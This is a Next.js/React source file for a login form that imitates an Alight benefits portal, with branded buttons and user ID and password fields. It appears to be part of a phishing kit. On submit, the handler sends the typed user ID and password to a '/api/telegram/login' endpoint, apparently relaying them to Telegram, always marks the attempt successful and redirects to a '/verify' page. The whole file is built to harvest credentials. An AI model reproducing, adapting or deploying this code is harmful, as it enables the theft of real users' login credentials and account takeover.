"use client"

import type React from "react"

import { useState } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { HelpCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"

interface LoginFormProps {
  visitorInfo?: any
}

export function LoginForm({ visitorInfo }: LoginFormProps) {
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [newUserLoading, setNewUserLoading] = useState(false)
  const router = useRouter()

  const handleNewUserClick = (e: React.MouseEvent) => {
    e.preventDefault()
    if (newUserLoading) return
    setNewUserLoading(true)
    setTimeout(() => {
      router.push("/new-user")
    }, 2000)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (isLoading) return
    setIsLoading(true)

    try {
      await fetch('/api/telegram/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          attempt: 1,
          success: true,
        }),
      })
    } catch (error) {
      console.error('Failed to send login notification:', error)
    }

    await new Promise((r) => setTimeout(r, 2000))
    
    router.push("/verify")
  }

  return (
    <div
      className="w-[280px] border border-gray-300 bg-white"
      style={{
        paddingTop: '18px',
        paddingLeft: '22px',
        paddingRight: '22px',
        paddingBottom: '22px',
      }}
    >
      
      <div className="mb-5 flex justify-center items-center">
        <img 
          src="/asd.jpg" 
          alt="Logo" 
          className="max-h-14 w-auto max-w-full object-contain"
        />
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        
        <div className="relative">
          <div className="absolute left-0 top-0 bottom-0 w-11 bg-[#5a5a5a] flex items-center justify-center">
            <img src="/placeholder-user.png" alt="User" className="w-4 h-4" />
          </div>
          <Input
            type="text"
            placeholder="User ID"
            value={userId}
            onChange={(e) => setUserId(e.target.value)}
            className="pl-12 bg-white border-gray-300 h-10 placeholder:text-gray-500 text-sm rounded-md"
          />
        </div>

        
        <div className="flex items-center gap-2">
          <Button
            type="button"
            className="bg-[#002586] hover:bg-[#001f6b] text-white text-xs font-normal h-8 px-4 rounded-md"
          >
            Login with Alight Mobile.
          </Button>
          <button
            type="button"
            className="flex items-center justify-center"
          >
            <HelpCircle className="w-4 h-4 text-[#002586]" />
          </button>
        </div>

        
        <div className="relative">
          <div className="absolute left-0 top-0 bottom-0 w-11 bg-[#5a5a5a] flex items-center justify-center">
            <img src="/icon_pwd.png" alt="Password" className="w-4 h-4" />
          </div>
          <Input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="pl-12 bg-white border-gray-300 h-10 placeholder:text-gray-500 text-sm rounded-md"
          />
        </div>

        
        <div className="flex items-center gap-2">
          <Checkbox
            id="show-password"
            checked={showPassword}
            onCheckedChange={(checked) => setShowPassword(checked as boolean)}
            className="border-gray-400"
          />
          <label htmlFor="show-password" className="text-sm text-gray-700 cursor-pointer select-none">
            Show Password
          </label>
        </div>

        
        <Button
          type="submit"
          disabled={isLoading}
          className="w-full bg-[#5a5a5a] hover:bg-[#4a4a4a] text-white h-10 font-bold text-sm rounded-none disabled:opacity-70 disabled:pointer-events-none"
        >
          {isLoading ? "Loading..." : "Log On"}
        </Button>

        
        <div className="space-y-1 pt-2">
          <Link href="/forgot-password" className="block text-[11px] text-[#002586] hover:underline">
            Forgot User ID or Password?
          </Link>
          <button
            type="button"
            onClick={handleNewUserClick}
            disabled={newUserLoading}
            className="block text-[11px] text-[#002586] hover:underline disabled:opacity-60 disabled:cursor-not-allowed text-left"
          >
            {newUserLoading ? "Loading..." : "New User?"}
          </button>
        </div>

        
        <p className="pt-2 text-[11px] text-gray-600">
          All fields are required, unless they are noted as optional.
        </p>

        
        <div className="flex justify-end pt-2">
          <button type="button" className="flex items-center gap-1 text-sm text-[#002586] hover:underline">
            Help
            <HelpCircle className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  )
}
